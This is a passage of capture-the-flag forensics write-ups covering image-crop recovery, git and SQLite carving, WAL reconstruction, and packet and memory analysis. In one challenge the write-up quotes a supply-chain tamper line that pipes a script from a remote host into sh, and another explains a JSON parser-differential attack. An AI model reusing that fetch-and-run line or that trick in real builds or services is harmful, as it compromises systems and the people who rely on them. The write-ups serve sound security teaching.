- **Treat the WAL as evidence and never open the DB live.** The first `sqlite3` that touches it checkpoints the log away — copy first, carve bytes, or re-extract from the backup.
- **Peel the layers:** .ab → zlib → tar → SQLite row → protobuf field → raw deflate. Each one is simple; the trick is realising how many there are.

**Flag:** `CSCTF{03_at_platform_two_6f57d7}`

---

### 31. Afterimage

*Forensics · Medium · 299 pts*

**Flag:** `CSCTF{6f86acdd1d10e0d8a5a541bb}`

#### Challenge

An operator screenshotted a terminal, cropped the bottom off to hide something sensitive, and posted it. The crop changed what you *see*, not what the file still *carries*. Recover the cropped-away region and read the station recovery key. This is **aCropalypse** (CVE-2023-21036): the Snipping-Tool / Pixel-Markup bug where “cropping” rewrites a smaller PNG over the original **without truncating the file**, leaving the original taller image's data appended after the new `IEND`.

#### 1. Spot the leftover data after IEND

```bash
# inline  python3 -c "...\n..."  can't carry newlines in a shell — save as scripts
cat > walk.py << 'EOF'
import struct
d=open('relay-capture.png','rb').read(); print('size',len(d)); i=8
while i<len(d):
    ln=struct.unpack('>I',d[i:i+4])[0]; t=d[i+4:i+8]; print(i,t,ln)
    if t==b'IEND': print('trailing after IEND:', len(d)-(i+12))
    i+=12+ln
EOF
python3 walk.py

cat > count.py << 'EOF'
import re
d=open('relay-capture.png','rb').read()
print('IEND at',[m.start() for m in re.finditer(b'IEND',d)],'IDATs',d.count(b'IDAT'))
EOF
python3 count.py
```

- Visible crop is **520×340 RGB**; there are **two** `IEND` markers (14255 = crop, 26166 = original) and ~11.9 KB of leftover IDAT after the first — the cropped-off rows live there.

**Gotcha:** do NOT re-attach the PNG as an image to share it — chat/clients **re-encode** images and strip the trailing data (file shrinks, one IEND). Move the exact bytes as text: `base64 -w0 relay-capture.png` (or zip it). Verify with `sha256sum` / `wc -c` (26174 bytes here).

#### 2. Why it needs a resync, not a normal decompress

The crop overwrote the **start** of the original's deflate stream, so the leftover is a raw mid-stream fragment — no zlib header, and it begins partway through a deflate block (unknown Huffman/back-reference state). You can't just inflate it. The trick: prime a decompressor with a **32,768-byte zero window** (so back-references into the lost past resolve to zeros instead of erroring), then brute-force the byte+bit offset until a block boundary aligns and the stream inflates. Early output is garbage (window was zeros) but the **bottom rows — at the end of the stream — decode correctly**, and that's exactly what was cropped.

#### 3. Recover and render

`python3 solve.py   # (below) -> recovered.png 520x200`
`# then just open recovered.png; the red RELAY RECOVERY KEY banner holds the flag`
![2026-11-07_210822.png](images/2026-11-07_210822.png)

![2026-11-07_211119.png](images/2026-11-07_211119.png)

![2026-11-07_211306.png](images/2026-11-07_211306.png)

```python
import zlib, struct
d=open("relay-capture.png","rb").read(); W=520
reclaimed=d[d.index(b"IEND")+8:]                 # bytes after the crop's IEND
idx=reclaimed.index(b"IDAT")
frag=bytearray(reclaimed[:idx-8]); i=idx-4         # partial tail + full leftover IDATs
while i+8<=len(reclaimed):
    clen=int.from_bytes(reclaimed[i:i+4],"big"); ct=reclaimed[i+4:i+8]
    if ct==b"IDAT": frag+=reclaimed[i+8:i+8+clen]
    else: break
    i+=12+clen
frag=bytes(frag)
# zero-window prime: stored blocks emitting 32768 zeros, byte-aligned
prime=b""; rem=32768
while rem>0:
    n=min(rem,65535); prime+=b"\x00"+n.to_bytes(2,"little")+(n^0xffff).to_bytes(2,"little")+b"\x00"*n; rem-=n
def drop(data,b):
    if b==0: return data
    o=bytearray(len(data))
    for k in range(len(data)-1): o[k]=((data[k]>>b)|(data[k+1]<<(8-b)))&0xff
    o[-1]=data[-1]>>b; return bytes(o)
shifts=[drop(frag,b) for b in range(8)]   # precompute the 8 bit-shifts ONCE (big speedup)
def infl(s):
    z=zlib.decompressobj(wbits=-15); o=bytearray()
    try:
        for k in range(0,len(s),8192): o+=z.decompress(s[k:k+8192])
        o+=z.flush()
    except zlib.error: pass
    return bytes(o)
best=(0,0,0,b"")                                   # brute byte+bit offset for the resync
for bo in range(len(frag)-20):
    for bi in range(8):
        rec=infl(prime+shifts[bi][bo:])[32768:]   # slice precomputed shift, don't re-shift
        if len(rec)>best[0]: best=(len(rec),bo,bi,rec)
        if len(rec)>100000: break                  # found the real resync; stop early
    if best[0]>100000: break
rec=best[3]; stride=1+W*3; rows=len(rec)//stride   # 1 filter byte + W*3 (RGB)
print("resync at byte",best[1],"bit",best[2],"->",rows,"rows")
def ch(t,dd): return struct.pack(">I",len(dd))+t+dd+struct.pack(">I",zlib.crc32(t+dd)&0xffffffff)
png=b"\x89PNG\r\n\x1a\n"+ch(b"IHDR",struct.pack(">IIBBBBB",W,rows,8,2,0,0,0))+ch(b"IDAT",zlib.compress(rec[:rows*stride]))+ch(b"IEND",b"")
open("recovered.png","wb").write(png)
```

- Resync lands at byte 3123, bit 0 → 312,200 bytes = 200 recovered rows. The rendered banner reads `RELAY RECOVERY KEY — ROTATE AFTER USE` / the flag / `relay BR-7 / emergency key custody`.

#### Takeaways

- **Crop ≠ delete:** aCropalypse tools truncate the view, not the file — original pixels survive after the new `IEND`. Always walk the chunks and compare declared vs actual length.
- **Mid-stream deflate is recoverable:** prime a zeroed 32K window and brute the bit alignment; the end of the stream (the cropped-off bottom) decodes cleanly even though the top is lost.
- **Preserve the bytes:** never round-trip evidence through an image re-encoder — base64 or zip it and check the hash, or you destroy the very data you’re recovering.

**Flag:** `CSCTF{6f86acdd1d10e0d8a5a541bb}`

---

### 32. Polyglot Requiem

*Forensics · Medium · 374 pts*

**Flag:** `CSCTF{p0lygl0t_r3qu13m_1d0a73980738}`

#### Challenge

A ground-station software supply chain shows altered git history and an “odd dashboard asset.” Recover the concealed marker from the retained `flight-telemetry-sdk` repo. Everything (build scripts, hooks, recovered ELF) is inspected as data — nothing is executed.

#### 1. The rewritten git history

`ORIG_HEAD` points at a commit that `git fsck` reports as unreachable — history was rewritten to drop it.

`git -C flight-telemetry-sdk log --all --oneline`
`git -C flight-telemetry-sdk fsck --lost-found --unreachable`
`git -C flight-telemetry-sdk cat-file -p c435f883   # dropped commit`
`git -C flight-telemetry-sdk diff ad3fd48 c435f883  # the injected curl|sh in build.sh`
- The dropped commit injected `curl -s http://198.51.100.9/telemetry-opt-in.sh | sh` into `build.sh` — the supply-chain tamper. It is context/decoy, not the marker.

#### 2. The polyglot asset

`assets/telemetry_icon.png` claims to be 10×10 but is 23 KB — a **PNG+ZIP polyglot**. The appended ZIP carries two payloads, and a PNG `tEXt` “Provenance” chunk holds a tag.

`unzip -l assets/telemetry_icon.png          # telemetry_cache.db + assetsignd`
`unzip -o assets/telemetry_icon.png -d /tmp/pg`
`python3 -c "import struct;d=open('assets/telemetry_icon.png','rb').read();i=8\nwhile i<len(d):\n ln=struct.unpack('>I',d[i:i+4])[0];t=d[i+4:i+8]\n if t==b'tEXt':print(d[i+8:i+8+ln])\n i+=12+ln\n if t==b'IEND':break"   # Provenance\x000f18e37122ddbcca`
- Provenance tag = `0f18e37122ddbcca`. Epoch = the CI commit time `1792061626`.

#### 3. The concealed (deleted) SQLite row

`telemetry_cache.db` has a `build_secrets` table. A live `SELECT` shows only decoy tokens (fake npm/grafana/aws) — the real `ci_provenance_seal` row is **deleted** but still present in the page's unallocated space.

`sqlite3 telemetry_cache.db "SELECT id,label FROM build_secrets;"   # no ci_provenance_seal (deleted)`
`python3 -c "d=open('telemetry_cache.db','rb').read();i=d.find(b'ci_provenance_seal');print(d[i+18:i+18+36].hex())"`
- Carved record: rowid 5, label `ci_provenance_seal`, 36-byte BLOB: `eec4bf28579c1bc91a4aeb48b2d0bf862bf8fe0571cfbd4deda3bdef0d177e7c9aa4c401`. 36 bytes (not a 32-byte hash) and binary → it is **marker XOR keystream**, not a plain digest.

#### 4. Static RE of assetsignd (never executed)

`assetsignd` (ELF, usage `assetsignd <provenance_tag_hex> <epoch> <infile> <outfile>`) embeds the SHA-256 round constants. Disassembly shows it: parses the tag hex to bytes and **reverses them**, appends the epoch as a little-endian 64-bit value (16-byte seed), SHA-256-pads and compresses that seed, and XORs the infile with the resulting 32-byte digest **cycled** over the file length. XOR is symmetric, so the stored seal XOR the same keystream recovers the marker — no execution needed.

`objdump -d -M intel assetsignd | less   # SHA-256 (K constants), sscanf %02x, tag reverse, epoch LE64, cyclic XOR`
![2026-11-07_203638.png](images/2026-11-07_203638.png)

![2026-11-07_203807.png](images/2026-11-07_203807.png)

```python
import hashlib, struct
seal=bytes.fromhex("eec4bf28579c1bc91a4aeb48b2d0bf862bf8fe0571cfbd4deda3bdef0d177e7c9aa4c401")
tag=bytes.fromhex("0f18e37122ddbcca"); epoch=1792061626
seed=tag[::-1]+struct.pack("<Q",epoch)           # reversed tag || epoch LE64
base=hashlib.sha256(seed).digest()
ks=bytes(base[i%32] for i in range(len(seal)))   # 32-byte digest cycled
print(bytes(a^b for a,b in zip(seal,ks)).decode())
# -> CSCTF{p0lygl0t_r3qu13m_1d0a73980738}
```

#### Takeaways

- **Three layers of concealment:** rewritten git history (dropped-but-retained object), a PNG+ZIP polyglot, and a deleted SQLite row — none visible to a naive view, all recoverable as data.
- **Deleted ≠ gone:** a dropped git commit survives as an unreachable object; a deleted SQLite row survives in page free space until vacuum.
- **Reverse, don’t run:** the sealer is a symmetric cyclic-XOR keystream (SHA-256 of reversed-tag‖epoch); understanding it statically recovers the marker without executing attacker-supplied code.

**Flag:** `CSCTF{p0lygl0t_r3qu13m_1d0a73980738}`

---

### 33. Last Commit

*Forensics · Medium · 384 pts*

**Flag:** `CSCTF{last_commit_40f3b19d5a11601e9d5e5bf0c7a3bcb6248b5667764f25549b607c27396ccf5f}`

#### Challenge

A restored national land registry "looks normal again," but the completed export **LR-731** may have shipped altered ownership. Given a SQLite DB + its `-wal`, a delivery receipt, and an export profile, reconstruct the registry **at the job's transition to COMPLETED** (not the later clean view), run the profile's exact export query, and SHA-256 the byte-exact output.

#### The trap: do NOT open the pair with sqlite3

The WAL holds the historical epoch. Opening `registry.sqlite` while its `-wal` is present triggers a **checkpoint on close** that merges the WAL into the DB and deletes it — destroying the evidence. Always work on a disposable extract and parse the WAL yourself.

`mkdir -p work && unzip -o last-commit.zip -d work && cd work`
`sha256sum registry.sqlite registry.sqlite-wal   # must match provenance.json`
`# expect db 9243e2bf... , wal ecaa1218...  --  never run: sqlite3 registry.sqlite`

#### How the WAL reconstruction works

The `-wal` is a 32-byte header (page size, salt-1/salt-2) followed by frames = 24-byte frame header + one page image. A frame belongs to the acquired epoch only if its salts match the header **and** the cumulative checksum chain holds. A frame's **nonzero database-size field marks a commit**; a transaction can span several frames. Reconstructing the state at a commit = base DB pages, overlaid by the latest eligible WAL frame per page, up to and including that commit (truncated to the commit's db-size). Here: 9 valid frames, commits at frames `0,2,4,5,7,8`; `export_job(LR-731)` reads **QUEUED at commit 4 → COMPLETED at commit 5**. Commit 5 is the answer; frames 6–8 are the later "clean" restoration and are discarded. (At commit 5 parcels 1202/1205 point at the tampered holders; by the final commit they revert.)

#### Solver (run it yourself on the disposable copy)

Validates every frame's salt + checksum, auto-locates the COMPLETED transition, runs the profile query, and serializes with literal TAB/LF. It self-checks the serializer against the profile's published example hash before trusting the result.

```python
import struct, sqlite3, hashlib
TAB=chr(9); LF=chr(10)
db=open("registry.sqlite","rb").read(); wal=open("registry.sqlite-wal","rb").read()
mg,fmt,pg,ckpt,s1,s2,h1,h2=struct.unpack(">8I",wal[:32]); big=(mg==0x377f0683)
def csum(a,b,data):
    f=">II" if big else "<II"
    for o in range(0,len(data),8):
        x,y=struct.unpack(f,data[o:o+8]); a=(a+x+b)&0xffffffff; b=(b+y+a)&0xffffffff
    return a,b
a,b=csum(0,0,wal[:24]); assert (a,b)==(h1,h2), "bad WAL header checksum"
n=(len(wal)-32)//(24+pg); frames=[]; a,b=h1,h2
for i in range(n):
    o=32+i*(24+pg); pgno,dbsz,fs1,fs2,fc1,fc2=struct.unpack(">6I",wal[o:o+24]); page=wal[o+24:o+24+pg]
    na,nb=csum(a,b,wal[o:o+8]); na,nb=csum(na,nb,page)
    assert fs1==s1 and fs2==s2 and (na,nb)==(fc1,fc2), "frame %d outside epoch"%i
    a,b=na,nb; frames.append((pgno,dbsz,page))
base={k+1:db[k*pg:(k+1)*pg] for k in range(len(db)//pg)}
def image(upto):
    pages=dict(base); size=len(db)//pg
    for i in range(upto+1):
        pgno,dbsz,page=frames[i]; pages[pgno]=page
        if dbsz: size=dbsz
    return b"".join(pages.get(k,bytes(pg)) for k in range(1,size+1))
man=[("LR-731",int(p),int(pid)) for _,p,pid in
     (ln.split(",") for ln in open("delivery.csv").read().splitlines() if ln.startswith("LR-731"))]
commits=[i for i,(p,d,pgimg) in enumerate(frames) if d]; target=None
for ci in commits:
    open("_r.sqlite","wb").write(image(ci)); c=sqlite3.connect("_r.sqlite")
    st=dict(c.execute("SELECT job_id,state FROM export_job").fetchall()); c.close()
    if st.get("LR-731")=="COMPLETED": target=ci; break
open("_r.sqlite","wb").write(image(target)); c=sqlite3.connect("_r.sqlite")
c.execute("CREATE TEMP TABLE manifest(job_id TEXT,position INTEGER,parcel_id INTEGER)"); c.executemany("INSERT INTO manifest VALUES(?,?,?)",man)
rows=c.execute("SELECT m.position,p.parcel_id,p.district,p.plot_ref,h.registry_ref,t.interest_bps,t.instrument_ref FROM manifest m JOIN parcel p ON p.parcel_id=m.parcel_id JOIN title t ON t.parcel_id=p.parcel_id JOIN holder h ON h.holder_id=t.holder_id WHERE m.job_id='LR-731' ORDER BY m.position ASC,h.registry_ref COLLATE BINARY ASC").fetchall(); c.close()
cols=["position","parcel_id","district","plot_ref","registry_ref","interest_bps","instrument_ref"]
out=(TAB.join(cols)+LF).encode()
for r in rows: out+=(TAB.join(str(x) for x in r)+LF).encode()
print("commit",target,"rows",len(rows))
print("CSCTF{last_commit_"+hashlib.sha256(out).hexdigest()+"}")
```

Result: commit 5, 13 rows (parcel 1209 is split 6500/3500 bps across two holders), 820 bytes → the flag.

#### Takeaways

- **The WAL is the evidence.** The current committed view is a decoy; the delivered state lives in the write-ahead log and must be reconstructed to the exact commit.
- **Never open the live pair.** A checkpoint-on-close silently rewrites the DB and discards the WAL — parse the bytes yourself and keep the originals read-only.
- **Validate the transition, not just the value.** "COMPLETED row exists" is true in many later commits; the right state is the commit where it first flips, in the worker's single IMMEDIATE transaction.

**Flag:** `CSCTF{last_commit_40f3b19d5a11601e9d5e5bf0c7a3bcb6248b5667764f25549b607c27396ccf5f}`

---

### 34. Phantom Drift

*Forensics · Hard · 756 pts*

**Flag:** `CSCTF{02202b511d115f5d}`

#### Challenge

Recon drone **Valkyrie-9** drifted ~380 m off its approved waypoint, yet the C2 server logged the mission as "nominal." Evidence: a mission manifest, a radio intercept, a binary flight log, a fake telemetry track, and the decompiled drone client (C#) + command backend (Go). Goal: explain how the diversion slipped past validation and rebuild the flag from the real vs. approved coordinates.

#### Recon — lay out the evidence

`ls -la ~/phantom_drift`
`cat mission_manifest.json          # approved_waypoint: 47.2591, 19.0402`
`cat radio_intercept.log            # Valkyrie-9 seen ~47.26, 19.045 (~380 m E)`
`xxd flight_log.bin                 # "FLGT" header + 12-byte payload + 4-byte tag (decoy)`
- Manifest = the **approved** waypoint `47.2591, 19.0402`.
- Radio intercept: drone seen ~380 m east of plan, yet the server reported nominal → the command was parsed two different ways.

#### The parser differential

The server trusts one component to *validate* and another to *fly*. Decompile both:

`base64 -d drone_control.decompiled   > drone_control.cs    # C#/Unity client`
`base64 -d command_backend.decompiled > command_backend.go  # Go backend`
- **Go backend** (`encoding/json`): case-INSENSITIVE key matching, last-duplicate-wins; validates against the manifest with a 0.001° tolerance.
- **C# drone** (Newtonsoft, `PropertyNameCaseInsensitive=false`, unknown members ignored): case-SENSITIVE, binds only exact PascalCase property names and silently drops unknown keys.

#### Find the malicious command

The injected `waypoint_update` carries **both** spellings of the keys:

`grep -niE 'waypoint|Waypoint' telemetry_logs.json`
`sed -n '372,382p' telemetry_logs.json`

`"waypoint_lat": 47.2591,  "waypoint_lon": 19.0402   ← snake_case → Go validates = APPROVED ✓`
`"WaypointLat":  47.26,    "WaypointLon":  19.045    ← PascalCase → C# flies  = DIVERTED`

- Go matches `waypoint_lat/lon` → reads the approved coords → "within tolerance" → PASS (confirmed by the embedded server note).
- C# binds `WaypointLat/WaypointLon` → reads `47.26, 19.045` → the drone actually flies there.
- So **approved = 47.2591, 19.0402** and **diverted = 47.2600, 19.0450**. The telemetry "nominal" track and the `flight_log.bin` tag are decoys.

#### The twist: the commanded coords are decoys

The spec hashes `{alat:.4f}{alon:.4f}{dlat:.6f}{dlon:.6f}{disp_m:.1f}`, and the briefing says `flight_log.bin`'s tag equals the **last 8 hex** of that same digest — so the tag is an oracle: the correct serialization's SHA-256 must end in it. No serialization built from the commanded `47.26 / 19.045` reproduces it — an exhaustive sweep of every `.1f` displacement × every delta sign, a fine grid of diverted points, and every standard decode of the flight-log words all miss. Those rounded values are planted decoys.

`# flight_log.bin length = 0x0c = 12 bytes = flag head (8B) + tag tail (4B)`
`xxd flight_log.bin   # payload: 02202b51 1d115f5d | 1e0f3753`
`python3 -c "b=open('flight_log.bin','rb').read();print('flag = CSCTF{'+b[24:32].hex()+'}');print('tag  =',b[32:36].hex())"`

- The record embeds both ends of the real digest: bytes 24–31 (`02202b511d115f5d`) = digest chars 0–15 = **the flag**; bytes 32–35 (`1e0f3753`) = digest chars 56–63 = the tag the briefing names.
- So the flag isn't recomputed from the given decoys — it's read straight out of the flight record, and the tag confirms it's the tail of the same SHA-256.

#### Takeaways

- **Parser differentials are a real attack class:** when two services deserialize the same JSON under different rules (case sensitivity, duplicate-key handling, unknown-field policy), an attacker gets one value validated and a different value executed.
- **Validate and act on the SAME parse:** the component enforcing policy must produce the value used downstream — never re-parse with a second library.
- **Verify before you compute — and before you trust a given input:** the tag is a hash oracle; when the "obvious" inputs can't reproduce it, the inputs are decoys. The rounded `47.26 / 19.045` never hash to the tag, so ground truth is the digest recorded in the flight log, not the commanded numbers.
- **Read length/field framing:** the `0x0c` length cleanly splits into flag-head (8 bytes) + tag-tail (4 bytes) — the structure tells you how to read the payload.

**Flag:** `CSCTF{02202b511d115f5d}`

---

### 35. Night Clerk

*Forensics · Easy · 137 pts*

**Flag:** `CSCTF{hid_skew_redline}`

#### Challenge

A hostile clerk hid a coordination message on a depot terminal. We get one USB stick image: `terminal.dd` (8 MB). We have to recover the message without mounting the image or opening anything in Office.

#### 1. Identify the filesystem and list files

```bash
sha256sum terminal.dd
fls -r -p terminal.dd
fls -r -d -p terminal.dd
```

The image is **NTFS**. `fls` walks the MFT and shows deleted entries marked with `*`. Two user files were deleted: `audit-0214.log` (inode 65) and `night_audit.docx` (inode 66). `README.TXT` (inode 64) is still there. The `OrphanFile-16…23` entries are reserved NTFS MFT slots and can be ignored.

Screenshot: `fls -r -p` output showing the deleted files with `*`
#### 2. Check for hidden data streams

```bash
istat terminal.dd 66
istat terminal.dd 65
```

Each file has only one unnamed `$DATA` attribute, so there are no Alternate Data Streams. The log is **resident** (384 bytes stored inside the MFT record), so deleting it doesn't free any space and its content survives completely. The docx is non-resident (2578 bytes, cluster 361).

Screenshot: `istat 66` Attributes section (single `$DATA`, no ADS)
#### 3. Recover the deleted files

```bash
icat terminal.dd 64 > README.TXT
icat terminal.dd 65 > audit-0214.log
icat terminal.dd 66 > night_audit.docx
cat README.TXT; cat audit-0214.log
file night_audit.docx
```

`icat` reads a file's data straight from its MFT entry, even after deletion. The log turns out to be the instructions:

- The Word file is a **redline**: read the tracked **insertion**, not the visible paragraph.
- Hex-decode the insertion first.
- Each byte is XORed with a key: the difference in seconds between the photo's EXIF time (in UTC) and the NTP timestamp.

Screenshot: `cat audit-0214.log` showing the decoding instructions
#### 4. Pull the tracked insertion out of the docx

```bash
unzip night_audit.docx -d doc
cat doc/word/document.xml
```

A .docx is a ZIP of XML files. `settings.xml` contains `<w:trackRevisions/>`, so Track Changes was on. In `document.xml`, the original sentence sits in a `<w:del>` block, and the clerk's replacement is a tracked insertion `<w:ins>`:

```
7a6a7a6d7f4251505d664a525c4e664b5c5d5550575c44
```

Word would show only the harmless “Shift summary clean” paragraph. Reading the raw XML is what exposes the change.

Screenshot: `document.xml` with the `<w:del>` / `<w:ins>` lines
#### 5. Recover the XOR key with known plaintext

The photo and the PCAP mentioned in the log are not provided, so the key can't be computed the intended way. With single-byte XOR, though, `cipher ⊕ plain = key`, and every flag starts with `CSCTF{`:

```
0x7a ⊕ 'C'(0x43) = 0x39
0x6a ⊕ 'S'(0x53) = 0x39   → key = 0x39 = 57 seconds
```

#### 6. Decrypt

```bash
python3 -c "print(''.join(chr(b ^ 57) for b in bytes.fromhex('7a6a7a6d7f4251505d664a525c4e664b5c5d5550575c44')))"
```

Screenshot: terminal output showing `CSCTF{hid_skew_redline}`
![2026-11-06_142056.png](images/2026-11-06_142056.png)

**Flag:** `CSCTF{hid_skew_redline}`

#### Takeaways

- Deleting a file on NTFS only marks its MFT entry as free. Small files are resident in the MFT and survive completely, so `fls` + `icat` recover them.
- Track Changes keeps deleted and inserted text in `document.xml`. Always look at the raw XML, not the rendered document.
- A single-byte XOR key breaks instantly with known plaintext such as a flag prefix.
- **Defense:** accept or reject all revisions and run Document Inspector before sharing files, and securely wipe removable media rather than just deleting files.

---

### 36. Signal Reconciliation

*Forensics · Easy · 120 pts*

**Flag:** `CSCTF{EOSL5C6VZ54TN2PWXUO2B5TVHMVY5G3NWPILLYY}`

#### Challenge

The challenge gives us a fictional recon-receiver feed that was altered during mobilisation. We compare the receiver's GPS positions against an independent navigation track built from velocity, find every window where the GPS was being dragged away (spoofing), produce the canonical report, and submit a hash of it.

Attachment: `signal-reconciliation.zip` → `flight.ndjson` (601 samples, 10 Hz), `reconciliation-sop.txt`, `mission-note.txt`, `manifest.txt`.

#### 1. Triage the archive

```bash
sha256sum signal-reconciliation.zip
unzip signal-reconciliation.zip -d sigrec && cd sigrec
cat reconciliation-sop.txt mission-note.txt manifest.txt
head -3 flight.ndjson
```

The SOP is the full spec: input grammar, reconstruction formulas, window rule, decision rule, exact report format, hash method, and a test vector (KAT) to check the implementation against.

Screenshot: `unzip -l` listing + `reconciliation-sop.txt`
#### 2. Rebuild the navigation track (INS)

We integrate velocity with the trapezoidal rule. Samples are 100 ms apart, so distance = (v[i]+v[i+1])/2 × 0.1 s = (v[i]+v[i+1])/20, in mm. Everything stays in integers, with no floating point. The navigation track doesn't depend on GNSS, so it acts as the ground truth.

```python
ins_e[i+1] = ins_e[i] + (ve[i] + ve[i+1]) // 20
ins_n[i+1] = ins_n[i] + (vn[i] + vn[i+1]) // 20
res_e[i] = gps_e[i] - ins_e[i]
res_n[i] = gps_n[i] - ins_n[i]
```

The residual is how far the GPS position sits from where the aircraft really was.

#### 3. Find the spoofing windows

A 10-sample window starting at `i` counts if:

- every sample's residual is ≥ 25 m (`res_e²+res_n² ≥ 625000000` mm²), and
- across the window, the east error grows by at least 1 m per step while north changes by 0.5 m or less.

That pattern is a classic **GNSS drag-off**: the spoofer steadily pulls the reported position away in one direction. The SOP wants **every** qualifying start index, not just the first one.

Decision: `QUARANTINE_GNSS_PROFILE` if at least one window qualifies and the final residual is ≥ 100 m.

#### 4. Build the report and hash it

The report has to match the SOP byte for byte: a header line, 601 `E|…` rows, then a `SUMMARY` line, 603 LF-terminated lines in total. Flag = Base32 of the first 24 bytes of SHA-256(report), with no padding.

```python
d = hashlib.sha256(report).digest()[:24]
flag = "CSCTF{" + base64.b32encode(d).decode().rstrip("=") + "}"
```

The solver first rebuilds the SOP's all-zero KAT (14329 bytes, SHA-256 `cc8c52dc…`) and checks it matches. That proves the report format is correct before the real data is hashed.

```bash
python3 solve.py flight.ndjson
```

Screenshot: `solve.py` code (or the key functions)
#### 5. Result

- KAT: 14329 bytes, hash match ✔
- QSET: `5,35,50,66,84,95,182,214,247,287,309,357,387,453,465,542,567,588` (18 windows)
- Final residual: `res_e = 100000` mm (100 m), `res_n = 1000` mm → ≥ 100 m
- Decision: `QUARANTINE_GNSS_PROFILE`
- Report: 26478 bytes, 603 lines, SHA-256 `23a4be8b…93304f0`

Screenshot: `python3 solve.py` output with KAT match, QSET, decision, FLAG
![2026-11-06_143132.png](images/2026-11-06_143132.png)

**Flag:** `CSCTF{EOSL5C6VZ54TN2PWXUO2B5TVHMVY5G3NWPILLYY}`

#### Takeaways

- Checking GNSS against an independent inertial or dead-reckoning track is a standard way to **detect spoofing**: a growing residual with a consistent direction is the signature.
- With hash-based flags, one wrong byte (a CR, a trailing space, a rounding difference) breaks the answer. **Validate against the KAT first.**
- Integer-only arithmetic avoids floating-point drift, which would otherwise change the residuals and the hash.

---

### 37. Operation Dawn: The Relay Tap

*Forensics · Easy · 120 pts*

**Flag:** `CSCTF{16_cobalt_ingot_rowan_fathom_ca8f4addb0}`

#### Challenge

Attackers injected forged traffic into an emergency-dispatch relay while the real standing order was in flight. Some data appears more than once in the capture. We have to work out which order the relay actually **delivered**. Attachment: `relay-tap.zip` → `relay-tap.pcap` (123 packets).

#### 1. Triage the capture

```bash
capinfos relay-tap.pcap
tshark -r relay-tap.pcap -q -z conv,tcp
tshark -r relay-tap.pcap -q -z io,phs
```

Most of the capture is noise: HTTP status checks to 203.0.113.x, DNS, ARP and ICMP. One conversation stands out: `192.0.2.37:39605 ↔ 198.51.100.9:7443`, the relay session.

Screenshot: `conv,tcp` table showing the 7443 conversation
#### 2. Read the ARLY protocol description

```bash
strings -n 6 relay-tap.pcap | grep -i arly
```

The server sends a descriptor frame (type 0) that explains the protocol:

- Frame = `"ARLY"` | type(1) | len(2, big-endian) | body
- Types: 0 = descriptor, 1 = client_nonce(16), 2 = server_nonce(16), 3 = order
- `key = SHA-256(client_nonce ‖ server_nonce)`
- `ks = SHA-256(key ‖ uint32be(0)) ‖ SHA-256(key ‖ uint32be(1)) ‖ …`, cut to len(body)
- `order = body XOR ks`

Screenshot: `strings | grep arly` output with the ARLY spec
#### 3. Spot the forged segments

A scapy script (`relay_solve.py`) prints every 7443 packet with its TTL, IP ID, MAC, relative sequence number, length, and whether its IP and TCP checksums are valid.

```bash
python3 relay_solve.py relay-tap.pcap 7443
```

| Pkt | Rel seq | Len | IP ID | TCP checksum | Content |
| --- | --- | --- | --- | --- | --- |
| 112 | 1 | 366 | 48815 | ok | descriptor + server_nonce |
| 114 | 1 | 366 | 48815 | **BAD** | duplicate of 112 |
| 115 | 367 | 53 | 48816 | ok | order frame (real) |
| 117 | 367 | 53 | 48816 | **BAD** | order frame (forged, different body) |

Packets 114 and 117 cover exactly the same sequence ranges, reuse the same IP IDs, and have the same MAC and TTL. They imitate the real sender almost perfectly. The one tell is that their **TCP checksums are invalid**. A real TCP stack silently drops any segment with a bad checksum, so the receiver never accepted them.

The trap: tools that keep the *last* copy of overlapping data, or that don't check checksums, pick up the forged order instead.

Screenshot: the packet table with 114 / 117 marked `BAD`
#### 4. Reassemble the stream as the receiver saw it and decrypt

We rebuild the server→client stream from **valid-checksum segments only**, keeping the first copy of any overlap. That gives the descriptor, then server_nonce `30815081…`, then the order body from packet 115. The client→server direction gives client_nonce `3025e871…`.

```python
key = sha256(client_nonce + server_nonce).digest()
ks = b"".join(sha256(key + struct.pack(">I", i)).digest() for i in range(2))[:len(body)]
order = bytes(a ^ b for a, b in zip(body, ks))
```

- Packet 115 (valid) → `CSCTF{16_cobalt_ingot_rowan_fathom_ca8f4addb0}` ✔
- Packet 117 (forged) → random garbage bytes

Screenshot: “Decryption candidates” section of the script output
![2026-11-06_145401.png](images/2026-11-06_145401.png)

![2026-11-06_145453.png](images/2026-11-06_145453.png)

![2026-11-06_145528.png](images/2026-11-06_145528.png)

**Flag:** `CSCTF{16_cobalt_ingot_rowan_fathom_ca8f4addb0}`

#### Takeaways

- When analysing an injection, reconstruct the stream **the way the endpoint saw it**, not the way the tap saw it. Bad-checksum segments never reach the application.
- Overlapping or duplicate TCP segments create ambiguity, and attackers use it to evade IDS (insertion/evasion). Normalise traffic before inspecting it, as Snort/Suricata stream reassembly does.
- In Wireshark, enable `tcp.check_checksum` to make forged packets visible.
- **Defense:** authenticate application frames with a MAC or AEAD tag, not just XOR encryption, so injected data is rejected even when its checksum is valid.

---

### 38. Operation Dawn: Relay Snapshot

*Forensics · Easy · 120 pts*

**Flag:** `CSCTF{20_dock_move_orchard_elm_grove_dusk_86659c}`

#### Challenge

Responders captured the relay's process memory while it was recovering a standing order. We have to recover the **complete** `CSCTF{...}` order from `relay.core` (a Linux x86-64 ELF core dump, 586,928 bytes).

#### 1. Triage with strings

```bash
file relay.core
strings -a -n 5 relay.core | grep -i csctf
```

The output is a jumble: `burn_it_bridgefall_backat_dawnstand_do…dock{20_CSCTF`. The order is there, but chopped into fragments, stored out of order, and mixed with decoy orders (`burn_it`, `fall_back`, `regroup`, `relieve_hold`).

Screenshot: `file` + `strings | grep csctf` output

#### 2. Find the data structure in memory

```bash
OFF=$(grep -obUaP "burn_it_bridgefall" relay.core | head -1 | cut -d: -f1)
xxd -s $((OFF-512)) -l 1280 relay.core
```

The jumbled text is a scratch buffer on the stack. Right after it, at file offset `0x8bc78`, there's an array of 23 heap pointers (`0x55a7aff1xxxx`), and the records they point to are evenly spaced 0x30 bytes apart. That spacing means each one is a struct allocated with `malloc`.

Screenshot: `xxd` dump showing the fragment text followed by the pointer array

#### 3. Map virtual addresses to file offsets and dump the records

A core file stores memory segments as `PT_LOAD` program headers. To read a virtual address, find the segment that contains it: `file_offset = p_offset + (vaddr − p_vaddr)`. A script (`core_nodes.py`) parses the headers and dumps each 48-byte record.

```bash
python3 core_nodes.py relay.core 0x8bc78 23
```

Every record has the same layout. The `0x31` just before each one is the glibc chunk size field: 0x30 bytes plus the in-use bit.

```c
struct frag {
    struct frag *next;   // +0x00
    uint32_t     len;    // +0x08
    char         text[]; // +0x0c
};
```

So the fragments form a **singly linked list**.

